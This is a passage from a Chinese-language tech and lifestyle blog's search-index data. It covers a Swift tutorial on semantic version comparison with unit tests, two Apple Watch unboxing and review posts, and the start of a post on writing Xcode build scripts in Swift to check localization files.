//.orderedDescending實際我們知道 1 == 1.0.0 ，但若用此方式判斷將得到 .orderedDescending ；可 參考此篇文章補0後再判斷 的做法；正常情況下我們選定 APP 版本格式後就不應該再變了，x.y.z 就一直用 x.y.z，不要一下 x.y.z 一下 x.y。複雜方式可直接使用已用輪子： mrackwitz/Version 以下為重造輪子。複雜方式這邊遵照使用語意化版本 x.y.z 最為格式規範，自行使用 Regex 做字串頗析並自行實作比較操作符，除了基本的 =/&gt;/≥/&lt;/≤ 外還多實作了 ~&gt; 操作符（同 Cocoapods 版本指定方式）並支援靜態輸入。~&gt; 操作符的定義是：大於等於此版本但小於此版本的(上一階層版號+1)EX:~&gt; 1.2.1: (1.2.1 &lt;= 版本 &lt; 1.3) 1.2.3,1.2.4...~&gt; 1.2: (1.2 &lt;= 版本 &lt; 2) 1.3,1.4,1.5,1.3.2,1.4.1...~&gt; 1: (1 &lt;= 版本 &lt; 2) 1.1.2,1.2.3,1.5.9,1.9.0... 首先我們需要定義出 Version 物件：@objcMembersclass Version: NSObject { private(set) var major: Int private(set) var minor: Int private(set) var patch: Int override var description: String { return \"\\(self.major),\\(self.minor),\\(self.patch)\" } init(_ major: Int, _ minor: Int, _ patch: Int) { self.major = major self.minor = minor self.patch = patch } init(_ string: String) throws { let result = try Version.parse(string: string) self.major = result.version.major self.minor = result.version.minor self.patch = result.version.patch } static func parse(string: String) throws -&gt; VersionParseResult { let regex = \"^(?:(&gt;=|&gt;|&lt;=|&lt;|~&gt;|=|!=){1}\\\\s*)?(0|[1-9]\\\\d*)\\\\.(0|[1-9]\\\\d*)\\\\.(0|[1-9]\\\\d*)$\" let result = string.groupInMatches(regex) if result.count == 4 { //start with operator... let versionOperator = VersionOperator(string: result[0]) guard versionOperator != .unSupported else { throw VersionUnSupported() } let major = Int(result[1]) ?? 0 let minor = Int(result[2]) ?? 0 let patch = Int(result[3]) ?? 0 return VersionParseResult(versionOperator, Version(major, minor, patch)) } else if result.count == 3 { //unSpecified operator... let major = Int(result[0]) ?? 0 let minor = Int(result[1]) ?? 0 let patch = Int(result[2]) ?? 0 return VersionParseResult(.unSpecified, Version(major, minor, patch)) } else { throw VersionUnSupported() } }}//Supported Objects@objc class VersionUnSupported: NSObject, Error { }@objc enum VersionOperator: Int { case equal case notEqual case higherThan case lowerThan case lowerThanOrEqual case higherThanOrEqual case optimistic case unSpecified case unSupported init(string: String) { switch string { case \"&gt;\": self = .higherThan case \"&lt;\": self = .lowerThan case \"&lt;=\": self = .lowerThanOrEqual case \"&gt;=\": self = .higherThanOrEqual case \"~&gt;\": self = .optimistic case \"=\": self = .equal case \"!=\": self = .notEqual default: self = .unSupported } }}@objcMembersclass VersionParseResult: NSObject { var versionOperator: VersionOperator var version: Version init(_ versionOperator: VersionOperator, _ version: Version) { self.versionOperator = versionOperator self.version = version }}可以看到 Version 就是個 major,minor,patch 的儲存器，解析方式寫成 static 方便外部呼叫使用，可能傳遞 1.0.0 or ≥1.0.1 這兩種格式，方便我們做字串解析、設定檔解析。Input: 1.0.0 =&gt; Output: .unSpecified, Version(1.0.0)Input: ≥ 1.0.1 =&gt; Output: .higherThanOrEqual, Version(1.0.0)Regex 是參考「 語意化版本文件 」中提供的 Regex 參考進行修改的：^(0|[1-9]\\d*)\\.(0|[1-9]\\d*)\\.(0|[1-9]\\d*)(?:-((?:0|[1-9]\\d*|\\d*[a-zA-Z-][0-9a-zA-Z-]*)(?:\\.(?:0|[1-9]\\d*|\\d*[a-zA-Z-][0-9a-zA-Z-]*))*))?(?:\\+([0-9a-zA-Z-]+(?:\\.[0-9a-zA-Z-]+)*))?$ *因考量到專案與 Objective-c 混編， OC 也要能使用所以都宣告為 @objcMembers、也妥協使用兼容OC 的寫法。 (其實可以直接 VersionOperator 使用 enum: String、Result 使用 tuple/struct) *若實作物件派生自 NSObject 在實作 Comparable/Equatable == 時記得也要實作 !=，原始 NSObject 的 != 操作不會是你預期的結果。2.實作 Comparable 方法：extension Version: Comparable { static func &lt; (lhs: Version, rhs: Version) -&gt; Bool { if lhs.major &lt; rhs.major { return true } else if lhs.major == rhs.major { if lhs.minor &lt; rhs.minor { return true } else if lhs.minor == rhs.minor { if lhs.patch &lt; rhs.patch { return true } } } return false } static func == (lhs: Version, rhs: Version) -&gt; Bool { return lhs.major == rhs.major &amp;&amp; lhs.minor == rhs.minor &amp;&amp; lhs.patch == rhs.patch } static func != (lhs: Version, rhs: Version) -&gt; Bool { return !(lhs == rhs) } static func ~&gt; (lhs: Version, rhs: Version) -&gt; Bool { let start = Version(lhs.major, lhs.minor, lhs.patch) let end = Version(lhs.major, lhs.minor, lhs.patch) if end.patch &gt;= 0 { end.minor += 1 end.patch = 0 } else if end.minor &gt; 0 { end.major += 1 end.minor = 0 } else { end.major += 1 } return start &lt;= rhs &amp;&amp; rhs &lt; end } func compareWith(_ version: Version, operator: VersionOperator) -&gt; Bool { switch `operator` { case .equal, .unSpecified: return self == version case .notEqual: return self != version case .higherThan: return self &gt; version case .lowerThan: return self &lt; version case .lowerThanOrEqual: return self &lt;= version case .higherThanOrEqual: return self &gt;= version case .optimistic: return self ~&gt; version case .unSupported: return false } }}其實就是實現前文所述判斷邏輯，最後開一個 compareWith 的方法口，方便外部直接將解析結果帶入得到最終判斷。使用範例：let shouldAskUserFeedbackVersion = \"&gt;= 2.0.0\"let currentVersion = \"3.0.0\"do { let result = try Version.parse(shouldAskUserFeedbackVersion) result.version.comparWith(currentVersion, result.operator) // true} catch { print(\"version string parse error!\")}或是…Version(1,0,0) &gt;= Version(0,0,9) //true... 支援 &gt;/≥/&lt;/≤/=/!=/~&gt; 操作符。下一步Test cases…import XCTestclass VersionTests: XCTestCase { func testHigher() throws { let version = Version(3, 12, 1) XCTAssertEqual(version &gt; Version(2, 100, 120), true) XCTAssertEqual(version &gt; Version(3, 12, 0), true) XCTAssertEqual(version &gt; Version(3, 10, 0), true) XCTAssertEqual(version &gt;= Version(3, 12, 1), true) XCTAssertEqual(version &gt; Version(3, 12, 1), false) XCTAssertEqual(version &gt; Version(3, 12, 2), false) XCTAssertEqual(version &gt; Version(4, 0, 0), false) XCTAssertEqual(version &gt; Version(3, 13, 1), false) } func testLower() throws { let version = Version(3, 12, 1) XCTAssertEqual(version &lt; Version(2, 100, 120), false) XCTAssertEqual(version &lt; Version(3, 12, 0), false) XCTAssertEqual(version &lt; Version(3, 10, 0), false) XCTAssertEqual(version &lt;= Version(3, 12, 1), true) XCTAssertEqual(version &lt; Version(3, 12, 1), false) XCTAssertEqual(version &lt; Version(3, 12, 2), true) XCTAssertEqual(version &lt; Version(4, 0, 0), true) XCTAssertEqual(version &lt; Version(3, 13, 1), true) } func testEqual() throws { let version = Version(3, 12, 1) XCTAssertEqual(version == Version(3, 12, 1), true) XCTAssertEqual(version == Version(3, 12, 21), false) XCTAssertEqual(version != Version(3, 12, 1), false) XCTAssertEqual(version != Version(3, 12, 2), true) } func testOptimistic() throws { let version = Version(3, 12, 1) XCTAssertEqual(version ~&gt; Version(3, 12, 1), true) //3.12.1 &lt;= $0 &lt; 3.13.0 XCTAssertEqual(version ~&gt; Version(3, 12, 9), true) //3.12.1 &lt;= $0 &lt; 3.13.0 XCTAssertEqual(version ~&gt; Version(3, 13, 0), false) //3.12.1 &lt;= $0 &lt; 3.13.0 XCTAssertEqual(version ~&gt; Version(3, 11, 1), false) //3.12.1 &lt;= $0 &lt; 3.13.0 XCTAssertEqual(version ~&gt; Version(3, 13, 1), false) //3.12.1 &lt;= $0 &lt; 3.13.0 XCTAssertEqual(version ~&gt; Version(2, 13, 0), false) //3.12.1 &lt;= $0 &lt; 3.13.0 XCTAssertEqual(version ~&gt; Version(3, 11, 100), false) //3.12.1 &lt;= $0 &lt; 3.13.0 } func testVersionParse() throws { let unSpecifiedVersion = try? Version.parse(string: \"1.2.3\") XCTAssertNotNil(unSpecifiedVersion) XCTAssertEqual(unSpecifiedVersion!.version == Version(1, 2, 3), true) XCTAssertEqual(unSpecifiedVersion!.versionOperator, .unSpecified) let optimisticVersion = try? Version.parse(string: \"~&gt; 1.2.3\") XCTAssertNotNil(optimisticVersion) XCTAssertEqual(optimisticVersion!.version == Version(1, 2, 3), true) XCTAssertEqual(optimisticVersion!.versionOperator, .optimistic) let higherThanVersion = try? Version.parse(string: \"&gt; 1.2.3\") XCTAssertNotNil(higherThanVersion) XCTAssertEqual(higherThanVersion!.version == Version(1, 2, 3), true) XCTAssertEqual(higherThanVersion!.versionOperator, .higherThan) XCTAssertThrowsError(try Version.parse(string: \"!! 1.2.3\")) { error in XCTAssertEqual(error is VersionUnSupported, true) } }}目前打算將 Version 再進行優化、效能測試調整、整理打包，然後跑一次建立自己的 cocoapods 流程。不過目前已經有很完整的 Version 處理 Pod 專案，所以不必要重造輪子，單純只是想順一下建立流程ＸＤ。也許也還會為已有的輪子提交實作 ~&gt; 的 PR。參考資料： Xcode Help 語意化版本 2.0.0 How to compare two app version strings in Swift mrackwitz/Version有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 7,101 Total Views Last Statistics Date: 2025-08-15 | 7,011 Views on Medium." }, { "title": "Apple Watch 原廠不鏽鋼米蘭錶帶開箱", "url": "/posts/zrealm-life/apple-watch-%E5%8E%9F%E5%BB%A0%E4%B8%8D%E9%8F%BD%E9%8B%BC%E7%B1%B3%E8%98%AD%E9%8C%B6%E5%B8%B6%E9%96%8B%E7%AE%B1-c0f99f987d9c/", "categories": "ZRealm Life.", "tags": "apple-watch, 生活, 開箱, apple, 米蘭錶帶", "date": "2020-11-02 23:23:46 +0800", "snippet": "Apple Watch 原廠不鏽鋼米蘭錶帶開箱Apple 原廠不鏽鋼 44 公釐石墨色米蘭式錶環開箱緊接著上篇「 Apple Watch Series 6 開箱 &amp; 兩年使用心得 」這次也終於狠下心入手了 原廠的米蘭錶帶 ，其實兩年前就想入手但一直沒下手；這次正好一次更新，反正蘋果保證錶帶能通用在所有後續的 Apple Watch 版本，所以不擔心之後更新手錶後錶帶不能使用。優點米蘭...", "content": "Apple Watch 原廠不鏽鋼米蘭錶帶開箱Apple 原廠不鏽鋼 44 公釐石墨色米蘭式錶環開箱緊接著上篇「 Apple Watch Series 6 開箱 &amp; 兩年使用心得 」這次也終於狠下心入手了 原廠的米蘭錶帶 ，其實兩年前就想入手但一直沒下手；這次正好一次更新，反正蘋果保證錶帶能通用在所有後續的 Apple Watch 版本，所以不擔心之後更新手錶後錶帶不能使用。優點米蘭錶帶由不鏽鋼織網與磁力錶環組成，不鏽鋼織網的好處是透氣、速乾；磁力錶環讓整條錶帶能調整至任意位置、更貼合手、穿戴方便、磁力很強不怕會掉；最重要的是讓 Apple Watch 整體更為正式、更好配合穿搭。缺點夾毛髮、夾毛髮、夾毛髮、比較重。原廠 vs 副廠？潛伏在 Apple 社團許久，觀察到大家最常問的問題就是米蘭錶帶原廠 vs 副廠的問題；個人覺得差別不大，主要還是在細節跟做工，原廠同樣會夾毛髮，但原廠的編織作工很細膩一體成型、磁貼部分磁力很強不會鬆動、乾淨親膚不會有鐵鏽味，但價差也差了好幾倍（原廠要價 $ 3,100），最好還是都先摸過實品再決定，個人猜測副廠 1~2千的米蘭錶帶應該就幾乎等於原廠的做工了。尺寸同 上篇 ，建議手較小的購買 Apple Watch 40 mm，因為 40 mm 的米蘭錶帶，手腕圍為 130–180 mm；相較 44 mm 的米蘭錶帶，手腕圍 150–200 mm 再短 20 mm。錶帶是一體成型長度無法調整；如果錶帶已經調到緊繃還是太大那只能考慮副廠，不然就吃胖點（？）所以還是去門市試戴一下比較保險。 朋友的案例，手太小買 44 + 米蘭錶帶，只能貼到底還有點「ㄌㄤ」！開箱 * 2020/11/01 購於 Apple Store 101 直營店。一樣樸實無華的紙質包裝包裝背面現在也不叫太空灰了，叫石墨色。內容物類似原廠矽膠錶帶，但差別在沒有多附短版的錶帶ＸＤ本體磁力錶扣磁力錶扣，可吸在任意位置，任意調整表環大小安裝指示有磁貼的那邊在下在外扣入 Apple Watch 本體。 不要像我一樣一開始裝反還不知道，雖然也沒差？：正確版！完成！實戴圖背面實戴圖正面補充原廠錶帶細節 *簡易辨別原廠/副廠米蘭錶帶的方法，但不一定準確；從合法通路購入才能確保不被騙！連接端 - 靠近磁力錶扣的那端 — 底部 — 有「Assembled in China」字樣連接端另一端 — 表面 — 有「44MM」字樣延伸閱讀 Apple Watch Series 6 開箱 &amp; 兩年使用心得有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 34,980 Total Views Last Statistics Date: 2025-08-15 | 34,120 Views on Medium." }, { "title": "Apple Watch Series 6 開箱 & 兩年使用體驗", "url": "/posts/zrealm-life/apple-watch-series-6-%E9%96%8B%E7%AE%B1-%E5%85%A9%E5%B9%B4%E4%BD%BF%E7%94%A8%E9%AB%94%E9%A9%97-eab0e984043/", "categories": "ZRealm Life.", "tags": "apple, apple-watch-series-6, apple-watch, 生活, 開箱", "date": "2020-10-14 20:48:38 +0800", "snippet": "Apple Watch Series 6 開箱 &amp; 兩年使用心得Apple Watch Series 6 開箱及選購指南＆兩年使用心得體驗彙整前言時光飛逝，距離 上一篇開箱 Apple Watch Series 4 的文章 也已經過了兩年了；以功能來說 Series 4 綽綽有餘沒有升級的必要，Series 5/Series 6 沒有什麼核心的突破功能，都是有會更好、沒有也沒關係的更...", "content": "Apple Watch Series 6 開箱 &amp; 兩年使用心得Apple Watch Series 6 開箱及選購指南＆兩年使用心得體驗彙整前言時光飛逝，距離 上一篇開箱 Apple Watch Series 4 的文章 也已經過了兩年了；以功能來說 Series 4 綽綽有餘沒有升級的必要，Series 5/Series 6 沒有什麼核心的突破功能，都是有會更好、沒有也沒關係的更新。但因 小鬼的新聞 ，所幸將原有的 Series 4 LTE 版先給家人配戴使用了；LTE 版遇到狀況可以不受手機有沒有在身邊的限制，都能撥出緊急電話，相較 GPS 版更加安全。個人的使用習慣是出門配戴，回家就拔下來充電，睡覺不會配戴，所以少了睡眠體驗的部分。我 Series 4 買的是 LTE 版，但由於手機都會帶在身邊實在沒必要每個月多付 $199 月費開通，而且在手錶上回訊息很麻煩、接電話也要有 AirPods 才方便，再加上手錶上的 Spotify 純粹是播放控制器，無法離開 iPhone 獨立播放（只有 Apple Music/KKBOX 可） and… 本人是 iOS APP / watchOS APP 開發者[2020–10–24 更新] ：Spotify 已支援獨立播放，在手錶 Spotify APP 中選擇播放裝置-&gt;Apple Watch-&gt;連線藍牙耳機-&gt;即可播放！（依然還不支援離線下載播放，需再有網路環境下才可使用）。Apple Watch Series 6 開箱直接進入本文重頭戲。下單這次選擇 GPS 44’mm 鋁合金版賽普樂絲綠（軍綠），搭配我的 iPhone 11 Pro 軍綠。沒有跟到第一批購買，我 9/15 晚上下單： 系統給的預估收到時間 10/16~10/19（可能剛好遇到大陸國慶長假） 10/10 通知發貨，預估 10/13 前就能拿到 10/13 通知因海關延誤到貨日期可能稍有延誤 實際 10/14 拿到，不過還是比原始預估收貨時間來得早了！開箱Apple Watch + 犀牛盾保護殼組翻開背面，開箱！開箱全過程完全用不到刀子，一路撕到底。Open!一個錶帶一個機體。這一代包裝厚度明顯減少許多（少了豆腐頭）機體開箱只附磁吸充電線。機體特寫這次機體的保護材質改為紙製的，上一代我記得是黑色的絨布。錶帶開箱組合！背面組合時可先安裝上半部錶帶，再拉掉紙質保護套，比較不容易手滑。Apple Watch 6 + iPhone 11 Prowith 奧樂雞泳圈雞Apple Watch 6 with 犀牛盾保護殼血氧測試玩一下這代的主打功能。隨顯螢幕休眠 vs 顯示時挺好的現在開始螢幕不會熄滅，不用抬腕等螢幕亮查看消息！ 開箱結束。兩年使用心得彙整整理一下這兩年的使用感覺和我自己的選購指南。提升生活體驗增加專注力Apple Watch 作為手機的延伸，定位在手機與人之間的緩衝；我們目前對電子產品的依賴就是直面手機、直面紛紛擾擾的通知資訊。不知道你是否跟我一樣覺得手機的通知很嚇人，即使是震動所發出的聲音也是，有時收到通知心臟也跟著抖了一下；接著下意識就拿出手機看了看，重要的事再接著處理、不重要的話就收起手機；然後這個流程每天不斷的重複在生活之中…雖然你大可以關閉聲音通知、關閉靜音時震動、甚至關閉所有通知功能；但另一方面你也因此與世界脫鉤，錯過了真的重要的通知訊息，結果產生另一種無時無刻都拿手機出來檢查的焦慮。綜合以上狀況 Apple Watch 就能在其中充當潤滑劑，在人與手機之間多加了一個漏斗進行過濾，手錶配戴中&amp;手機休眠時僅手錶會通知，可以設定特定 APP 的通知才會傳到手錶、關閉特定 APP 通知聲音/震動。你可能會說，這些設定不是跟手機一樣？但就體驗來說，手錶的聲音/震動更為輕柔不干擾，即使你關閉聲音/震動也能在抬腕時快速查看有無通知。日常體驗的提升在及增加專注力的方式就是在手錶上快速 Review 通知訊息，然後決定要繼續當前的工作，還是拿出手機處理訊息內容；中間被打斷的時間非常短（就是看手錶的時間）、也避免一直拿出手機會分心其他事情，增加做事效率。健康生活、記錄運動透過有 Apple Watch 才能使用的獨佔的「健身」APP，能記錄你一天的生活，包含每天活動量、走路、心跳、運動紀錄，活動量增減統計、更仔細的健康資訊；社群方面還能與朋友競賽活動量、解鎖勳章，增加運動動力。不過運動很看人，會運動的人還是會運動、不會運動的人也不會因為手錶而去運動；他頂多就是增加了運動的紀錄跟趣味性。Apple Pay手機都不用拿出來手錶按兩下就能感應付款，非常方便；尤其在已經大包小包的時候，沒有多餘的手去口袋掏手機出來時；另外也能安裝有支援 Apple Watch APP 的發票 APP，先點 APP 開載具條碼讓店員掃，然後再按兩下叫出 Apple Pay 付款。我個人最常見的使用習慣是用手機 widget 讓店員掃載具或是會員條碼（如 7–11/全家，因他們也沒提供 Apple Watch APP），然後在快速按兩下手錶叫出 Apple Pay，同一隻手感應付款。 存裡面，不用收據。個人風格隨你搭配錶面、錶帶都能隨時依照你的心情更換；錶面固定了幾個，幾個上班用、幾個放假用；錶帶這兩年買了四條…有皮革的、有金屬的、有編織的，還有保護殼顏色更換…根據穿搭搭配。蘋果全家桶連動 手錶可直接解鎖 Mac 電腦 手錶可一鍵查找手機（強迫手機發出嘟嘟聲） 手錶可當藍芽自拍按鈕，控制手機鏡頭拍照查看天氣個人很習慣看手錶的當前天氣狀況、降雨機率，一目瞭然；我用手機看都要點好幾層才能看到我要的資訊。鬧鐘及計時倒數計時器跟鬧鐘也是我很愛用的功能，可以快速在手錶上啟動倒數計時器，在配戴手錶的情況下計時器到跟鬧鐘響時都會透過手錶通知你（如果手錶開靜音則用手錶震動提醒你）個人覺得非常舒服，尤其是想自己小憩一下時，怕鬧鐘鈴聲或手機鬧鐘震動會打擾到其他同事。地圖騎機車時蠻好用的，可以 直接查看路線地圖 、路線/轉彎震動提示；但缺點就是地圖沒有針對機車優化，要 自己注意禁行機車路線 ，路線規劃能力普通。手錶查看路線地圖Google Map 最近重回 Apple Watch ，但沒辦法直接查看路線地圖，只有文字導航提示功能。跌倒偵測因最近大家很注意這個項目，特別列出來分享個人觸發經驗；有一次坐車上車時左手快速且大力地蹬了一下座椅，觸發成功跌倒偵測；搭會先瘋狂連續震動和發出聲音呼叫你，看你有沒有意識，如果不理他 30 秒後就會播打緊急電話及通知設定的緊急聯絡人。Apple Watch 跌倒偵測 實測，1分鐘打給119救援。 - watchOS 5 之前是超過 65 歲才會預設開啟跌倒偵測、小於 65 歲預設是關閉的；這部分可以確認一下設定。 - 緊急聯絡人可指定多位，需事先設定。推薦安裝的 APP有看過 前一篇開箱 的朋友，那篇文章除了開箱、使用教學，還有一些 APP 推薦；老實說後來我都刪了，只留內建的 APP 跟一些常用的通訊軟體；因為只有一開始新奇會裝一堆 APP，後來也都沒在用。說實話需要複雜操作的時候你會用手機，手錶真的只需要快速而已。Apple Watch 這兩年的發展如同前述，Series 4 與 Series 6 功能、產品定位方面都沒有變；都是 iPhone 手機的延伸，並非要取代 iPhone；這兩年並沒有突破性功能，續航也還是一天一充。第三方 APP 方面兩年來沒新增多少，但有越來越多的趨勢；Line、Goolge Map 最近更新也都加強了 Apple Watch APP 部分，沒有被遺忘。之前寫過一篇文章分享 自己動手做 Apple Watch APP 的經驗，基於 watchOS 5 開發，可以發現官方開放的功能很少（目前也差不多），所以第三方能發揮的空間有限以至於 APP 很少。watchOS目前已更新到 watchOS 7，同 iOS 一年一更。watchOS 6： 加入環境噪音偵測、月經記錄（適合女性朋友）、網路對講機watchOS 7： 加入睡眠追蹤功能、洗手時洗手時間輔助提示、家庭共享功能watchOS 7 家庭共享功能 （僅限 LTE 版）這部分我因為把原本 Series 4 手錶讓給家人有實際體驗過，可 參考此開箱影片 ；這功能手錶是綁在你的手機上、手錶要在附近才能更改設定，設定流程完成後部分設定無法再調整要重新設定，被共享的家人只能使用，不能自行客製化。好處是配戴者不一定要是 iPhone 用戶！ 根據 官網資料 ，此功能僅限配備行動網路 LTE 版 Series 4 後續機型才能使用！選購指南到底該不該買？我想會看到這邊的朋友，80% 都已經想買了；我覺得如果是科技愛好者值得買來玩玩、如果手錶對你來說是配件，同樣的價格可以買到更美的、如果是只為了運動而買，有更好的運動錶可以考慮，Apple Watch 偏綜合需求及增強體驗所設計。 小鬼的案例其實有 Apple Watch 也無法避免因小鬼是洗完澡出浴室時跌倒，Apple Watch 防水但並不防水蒸氣 ，如果時常戴手錶洗澡很容易就壞掉了、另外因為要一天一充一般都是洗澡時拔下來充電，也不會配戴。 依然還只是手機的延伸、蘋果實驗性產品 一天一充，出門也都要帶充電器 在從 Series 4 更換到 Series 6 時中間隔了兩三週都沒戴，個人感覺也沒差。Series 6 or SE or 二手 Series 4/5?性能上都很足夠再撐個3~5年都還行，有預算當然買新不買舊，追求 CP 值可以購買 SE ，如果預算有限可以買二手 Series 4/5/LTE版，較好入手。 Apple Watch 僅能與 iPhone 配對（ Android 手機、iPad 都無法 ），另外也要考慮當前手機 iOS 版本， watchOS 7 僅限配對 iOS ≥ 14 以上機種 （ watchOS 6 =&gt; iOS ≥ 13/watchOS 5 =&gt; iOS ≥ 12） iPhone 要先升級到相對應的最低 iOS 版本才能配對使用。Series 6 / SE 不附豆腐充電頭。watchOS 7 的 家庭共享功能 （可查看小孩動向狀態、老人健康狀況） 只限 Series 4 以上版本或 SE 版 。鋁合金 or 不鏽鋼 or 鈦金屬？不鏽鋼版本 （感謝同事友情支援）看你怎麼定位這隻錶，如果是新奇好玩買鋁合金就好；如果要加強飾品配件屬性則買不鏽鋼以上版本，更美更好搭。鋁合金版二手市場需求較多，新一代出來比較好脫手（我的 Series 4 還能賣到 7~8千）。鋁合金版的機身跟玻璃都較脆弱、螢幕玻璃也不抗刮，建議再多買保護殼+貼滿版保護貼。保護殼（約 $400）+ 保護貼建議找水凝貼、果凍貼（約 $800）否則容易遇到不貼合問題；總計約再多+ $1500 鋁合金版也能有完整的保護。 另外附上血淚教訓，如果你有貼保護貼一定要買保護殼否則容易碎邊（我因為這樣重貼了三張損失快 $3000）、保護貼一定要找好的能貼合的不然會很難用，都是浪費$。小豪包膜的 HAO 果凍膠滿版玻璃保護貼全透明＆全膠完全貼合，不影響滑動順暢跟顯示。犀牛盾+保護貼 螢幕會變稍微厚一點點，所以內框可能會有一點浮起（看保護殼的公差），不過卡扣都還是扣得進去。 小豪包膜是說建議不要多塞犀牛盾的內框會比較容易擠壓到保護貼，只用外框就好；但我 Series 4 這個狀態用了兩年都沒事，所以大家就自行斟酌囉。40mm or 44mm?看你手的粗細，男生一般建議戴 44，太小有點怪。 如果你要買鋁合金+保護殼要考慮加上保護殼的大小會不會太大。GPS or LTE 行動網路版?考量到之前買 LTE 都沒用這次改買 GPS 版了，便宜 $ 3000。GPS or LTE 的考量點除了你會不會有場景會只戴手錶出門，還有最近大家最在意的跌倒報警功能， GPS 版僅限手機在身邊或手錶有辦法連到當前網路環境 WiFi 下，手錶連線到手機進行緊急報警 （若條件無法成立則一樣無法通知報警）；LTE 版則可獨立運作，相對更安全；手機與手錶間通訊也是一樣，GPS版或未開通 LTE，則透過手機在手錶附近、手錶有辦法連到當前網路環境 WIFI 下進行通訊。 手錶有辦法連到當前網路環境 WiFi 的意思是，手機、手錶曾經連線過此 WiFi ，系統有紀錄能直接連線。watchOS 7 的 家庭共享功能 （可查看小孩動向狀態、老人健康狀況） 只有 LTE 版能使用 ，因為 手錶的資料是傳回設定人（家長）而非配戴者的手機 。錶帶部分錶帶只區分： 大的： 42 （Apple Watch 3 以下）/ 44 （Apple Watch 4 以上） 小的： 38 （Apple Watch 3 以下）/ 40 （Apple Watch 4 以上）且蘋果表示保證錶帶尺寸都不會更改（不然誰買 Hermès 版ＸＤ）至少目前 1~6 代錶帶都能共通。 Apple Watch 原廠不鏽鋼米蘭錶帶開箱 ：Apple Watch 原廠不鏽鋼米蘭錶帶開箱一般版 / Nike 版 / Hermès 版Nike 版只多 Nike 版專屬錶面，Hermès 版除了有Hermès 版專屬錶面還是Hermès 錶帶配不銹鋼版本。升級指南如果你現在手上的是 Series 3/Series 2/Series 1 建議可升級，至少升到 Series 4 ；4 開始螢幕變滿版（很多新的錶面都要求 4 以上才能用）、處理器效能更好幾乎不會卡頓，升級有感。Series 4 可升可不升，畢竟主要只差在隨時顯示螢幕及血氧計，Apple Watch 的抬腕顯示夠快夠敏捷，隨時顯示當然更好但也沒一定要；血氧計部分沒通過醫療驗證，僅作參考。如果已經有 Series 5，可以再等等下一代，沒有升級的必要。詳細比較可參考官網「 比較所有錶款 」，還有些細節功能的差異，例如：高度計、指南針…等等Apple 官網延伸閱讀 Apple Watch 原廠不鏽鋼米蘭錶帶開箱 看更多 Apple Watch 基礎使用教學、APP 推薦 AirPods 2 開箱及上手體驗心得 智慧家居初體驗 — Apple HomeKit &amp; 小米米家 動手做一支 Apple Watch App 吧！(Swift)有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 62,840 Total Views Last Statistics Date: 2025-08-15 | 62,645 Views on Medium." }, { "title": "Xcode 直接使用 Swift 撰寫 Run Script！", "url": "/posts/zrealm-dev/xcode-%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8-swift-%E6%92%B0%E5%AF%AB-run-script-41c49a75a743/", "categories": "ZRealm Dev.", "tags": "ios, shell-script, xcode, ios-app-development, toolkit", "date": "2020-09-17 23:53:20 +0800", "snippet": "Xcode 直接使用 Swift 撰寫 Shell Script！導入 Localization 多語系及 Image Assets 缺漏檢查、使用 Swift 打造 Shell Script 腳本Photo by Glenn Carstens-Peters緣由因為自己手殘，時常在編輯多語系檔案時遺漏「;」導致 app build 出來語言顯示出錯再加上隨著開發的推移語系檔案越來越龐大，重複...", "content": "Xcode 直接使用 Swift 撰寫 Shell Script！導入 Localization 多語系及 Image Assets 缺漏檢查、使用 Swift 打造 Shell Script 腳本Photo by Glenn Carstens-Peters緣由因為自己手殘，時常在編輯多語系檔案時遺漏「;」導致 app build 出來語言顯示出錯再加上隨著開發的推移語系檔案越來越龐大，重複的、已沒用到的語句都夾雜再一起，非常混亂（Image Assets 同樣狀況）。一直以來都想找工具協助處理這方面的問題，之前是用 iOSLocalizationEditor 這個 Mac APP，但它比較像是語系檔案編輯器，讀取語系檔案內容＆編輯，沒有自動檢查的功能。期望功能build 專案時能自動檢查多語系有無錯誤、缺露、重複、Image Assets 有無缺漏。解決方案要達到我們的期望功能就要在 Build Phases 加入 Run Script 檢查腳本。但檢查腳本需要使用 shell script 撰寫，因自己對 shell script 的掌握度並不太高，想說站在巨人的肩膀上從網路搜尋現有腳本也找不太到完全符合期望功能的 script，再快要放棄的時候突然想到： Shell Script 可以用 Swift 來寫啊 ！相對 shell script 來說更熟悉、掌握度更高！依照這個方向果然讓我找到兩個現有的工具腳本！由 freshOS 這個團隊撰寫的兩個檢查工具： Localize 🏁 Asset Checker 👮完全符合我們的期望功能需求! ! 並且他們使用 swift 撰寫，要客製化魔改都很容易。Localize 🏁 多語系檔檢查工具功能： build 時自動檢查 語系檔自動排版、整理 檢查多語系與主要語系之缺漏、多餘 檢查多語系重複語句 檢查多語系未經翻譯語句 檢查多語系未使用的語句安裝方法： 下載工具的 Swift Script 檔案 放到專案目錄下 EX: ${SRCROOT}/Localize.swift 打開專案設定 → iOS Target → Build Phases →左上角「+」 → New Run Script Phases → 在 Script 內容貼上路徑 EX: ${SRCROOT}/Localize.swift4. 使用 Xcode 打開編輯 Localize.swift 檔案進行設定，可以在檔案上半部看到可更動的設定項目：//啟用檢查腳本let enabled = true//語系檔案目錄let relativeLocalizableFolders = \"/Resources/Languages\"//專案目錄（用來搜索語句有沒有在程式碼中使用到）let relativeSourceFolder = \"/Sources\"//程式碼中的 NSLocalized 語系檔案使用正規匹配表示法//可自行增加、無需變動let patterns = [ \"NSLocalized(Format)?String\\\\(\\\\s*@?\\\"([\\\\w\\\\.]+)\\\"\", // Swift and Objc Native \"Localizations\\\\.((?:[A-Z]{1}[a-z]*[A-z]*)*(?:\\\\.[A-Z]{1}[a-z]*[A-z]*)*)\", // Laurine Calls \"L10n.tr\\\\(key: \\\"(\\\\w+)\\\"\", // SwiftGen generation \"ypLocalized\\\\(\\\"(.*)\\\"\\\\)\", \"\\\"(.*)\\\".localized\" // \"key\".localized pattern]//要忽略「語句未使用警告」的語句let ignoredFromUnusedKeys: [String] = []/* examplelet ignoredFromUnusedKeys = [ \"NotificationNoOne\", \"NotificationCommentPhoto\", \"NotificationCommentHisPhoto\", 